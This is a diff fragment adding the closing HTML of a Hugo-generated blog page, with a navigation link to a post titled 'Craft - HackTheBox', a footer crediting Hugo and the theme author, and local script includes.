+      <span class="button next">
+        <a href="/posts/craft/">
+          <span class="button__text">Craft - HackTheBox</span>
+          <span class="button__icon">→</span>
+        </a>
+      </span>
+      
+    </div>
+  </div>
+  
+
+  
+
+</div>
+
+  </div>
+
+  
+    <footer class="footer">
+  <div class="footer__inner">
+    
+      <div class="copyright">
+        <span>© 2020 Powered by <a href="http://gohugo.io">Hugo</a></span>
+    
+        <span>:: Theme made by <a href="https://twitter.com/panr">panr</a></span>
+      </div>
+  </div>
+</footer>
+
+<script src="/assets/main.js"></script>
+<script src="/assets/prism.js"></script>
+
+
+
+
+
+  
+</div>
+
+</body>
+</html>
